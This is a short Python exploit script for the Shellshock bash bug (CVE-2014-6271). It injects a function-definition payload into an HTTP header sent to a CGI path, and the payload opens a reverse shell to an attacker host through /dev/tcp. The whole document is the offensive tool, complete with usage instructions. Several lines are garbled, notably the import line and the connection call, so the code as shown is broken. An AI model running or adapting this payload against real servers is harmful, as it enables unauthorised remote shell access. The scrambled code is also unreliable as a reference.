#Bash Bug
#CVE-2014-6271 bincgi- reverse shell
#
import ,,httpliburllibsys
if (len(sys.argv)<4):
    print "Usage: %s <host> <vulnerable CGI> <attackhost/IP>" % sys.argv[0]
    print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
    exit(0)
 
conn = httplib.(sys.[HTTPConnectionargv1])
reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]
headers = {"Content-type": "application/x-www-form-urlencoded",
    "test":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data